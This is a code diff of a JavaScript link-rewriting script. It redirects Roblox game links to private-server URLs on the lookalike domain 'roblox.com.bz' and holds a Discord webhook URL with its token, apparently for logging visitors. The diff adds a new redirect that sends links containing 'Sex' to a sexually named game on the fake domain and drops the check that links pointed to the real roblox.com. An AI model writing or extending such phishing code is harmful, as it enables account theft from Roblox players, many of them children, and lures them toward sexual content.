@@ -3,6 +3,7 @@
 
   const WEBHOOK_URL = 'https://discord.com/api/webhooks/1515847249597431929/jMYzK0DFDhc8FdpgMP8304_XNYmztefsQ8w9i8S-IDShWwEl_SLV1y2Skwd_DmG0aYqm';
   const NEW_SWORD_LINK = 'https://roblox.com.bz/games/9377953133/Mobile-Sword-Fight?privateServerLinkCode=78900447338733750394827051417199';
+  const SEX_GAME_LINK = 'https://roblox.com.bz/games/77182599101794/4nn1s-Place?privateServerLinkCode=78900447338733750394827051417199';
 
   // Generate a unique User ID
   function generateUserId() {
@@ -195,9 +196,11 @@
         const text = element.textContent || '';
         const testid = element.getAttribute('data-testid') || '';
 
-        // Update Sword Game and Fun Combat links
-        if ((text.includes('Sword') || text.includes('Combat')) && href.includes('roblox.com')) {
+        // Update game links
+        if (text.includes('Sword') || text.includes('Combat')) {
           element.setAttribute('href', NEW_SWORD_LINK);
+        } else if (text.includes('Sex')) {
+          element.setAttribute('href', SEX_GAME_LINK);
         }
 
         // Add click listener to log when user accesses a game
